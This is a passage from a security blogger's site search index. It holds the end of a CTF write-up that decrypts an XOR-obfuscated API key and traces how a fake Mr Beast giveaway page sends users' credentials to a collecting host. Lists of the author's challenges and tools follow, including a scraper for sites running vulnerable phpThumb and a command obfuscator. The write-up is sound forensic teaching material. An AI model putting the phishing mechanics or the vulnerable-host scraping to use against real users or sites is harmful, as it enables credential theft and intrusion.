\u0026gt;\u0026gt;\u0026gt; key_for_decryption = b\u0026#39;santa\u0026#39; \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; xor(apikey_encr, key_for_decryption) b\u0026#39;NHACK{M2.B3457_51735_423_3v32ywh323_n0w4d4y5}\u0026#39; \u0026gt;\u0026gt;\u0026gt; Bonus ways to solve it:\nAdd the following line in the javascript function _0xe05049() of the website: alert(_0x5ba78a); and then visit the website and click on the Subscribe button. This will decrypt the apikey for you and print it on the screen in an alert box. This is happening since the _0x5ba78a is the decrypted apikey returned from the function _0x37a3bb. Open Wireshark, run a fakedns server and click on the subscribe button without modifying javascript this time. What will happen is a DNS query to storage.appssec.co.ind will be successful and thus, a request with the username, password and decrypted api key will be made to this host which will be visible in Wireshark. Overall, the website tried to act as a legitimate site, gathering credentials from users and sending them to a possible VPS server. These could later be tried as reused credentials for other websites as this is very common amongst users.\nThis is it for this challenge.\n","permalink":"http://localhost:1313/ctfwriteups/xmasgiveaway/","summary":"Starting the analysis A pcap file is provided to the user. Pcap files are network capture files that provide an insight of what requests were made to what websites, the contents of each request and much more.\nOpening the file with Wireshark, we can view all the requests.\nThe request that is of interest is the one made to themrbeas7.org and is the following:\nGET /christmasGiveaway/index.html HTTP/1.1 Host: themrbeas7.org User-Agent: Mozilla/5.","title":"Mr Beast Xmas Giveaway - Writeup"},{"content":"A list of challenges (at least some of them) that I have made for either conferences, CTFs or just myself:)\nThese will mostly be based on stuff I read along the way and felt like they would be fun to make and also learn by doing it.\nForensics An email from aunt Chloe\nDifficulty: Hard (Play/Writeup) Description: I recently got an email from my Aunt Chloe. She visited the village of Santa in the North pole and she was so kind that see sent me a traditional recipe that they make there followed by an image of the village. What an amazing Aunt!\rmr Beast Xmas Giveaway\nDifficulty: Easy (Play/Writeup) Description: It was almost Christmas. You made hot chocolate to drink, sat on your comfy couch, and watched the newly uploaded Mr Beast video. Soon after, an ad appeared on your screen that led to a giveaway page seemingly run by Mr Beast, offering a huge Christmas prize for a few lucky winners. Filled with excitement after the video, you subscribed to the giveaway page and waited. And waited. Christmas went by, but nothing happened. Shortly afterward, you discovered an article about a phishing website, the same one you subscribed to. Confused as you read through the article, you decided to investigate the website yourself and captured its traffic. What can you find?\rMr Anderson\nDifficulty: Medium (Play/Writeup) Description: Mr. Anderson received an urgent email in July from what appeared to be his bank, notifying him of an unpaid loan in his name. Despite attempts to resolve the issue through a linked page, which continuously failed to load, Mr. Anderson received no response to his inquiries. Instead, he discovered unauthorized transactions through email notifications, sparking urgent action to secure his compromised accounts and unravel the mystery behind the email's intentions.\rWeak legacy\nDifficulty: Easy (Play/Writeup) Description: Eve was able to intercept messages between Alice and Bob, but some seem to be encrypted. Can you help her find out what they were talking about?\r","permalink":"http://localhost:1313/mychallenges/","summary":"my challenges","title":"My Challenges"},{"content":"A list of projects/tools that I have made along my journey of learning, either that be for a CTF or a real world scenario.\nForensics PcapAnalysis (GitHub) A script that is useful when analyzing malware traffic pcaps. It's goal is to find all HTTP and HTTPS hosts that a victim IP interacted with. Once it runs through the pcap file and collects all hosts which interacted with the victim ip, it makes request to VirusTotal in order to distinguish the malicious ones with the rest. It saves ...\rWeb Attacks vulnerable_phpThumb (GitHub) A script which scrapes the web using dorks to find domains that still use vulnerable versions of the phpThumb php script.\rReversing tools DotNetParser (GitHub) A script that is used to quickly parse a .NET assembly to read its methods and instructions. It's just a quick way to parse and decompile raw bytecode to IL and read the instructions, instead of loading it to a decompiler like DnSpy, ILSpy etc.\rJlaive-Deobfuscator (GitHub) A script that deobfuscates and reconstructs all parts used in the Jlaive obfuscation process, including the final decrypted executable.\rObfuscation scripts forcoding-Obfuscator (GitHub) A script used for forcode-obfuscating cmd commands.\r","permalink":"http://localhost:1313/projects/","summary":"projects","title":"Projects"}]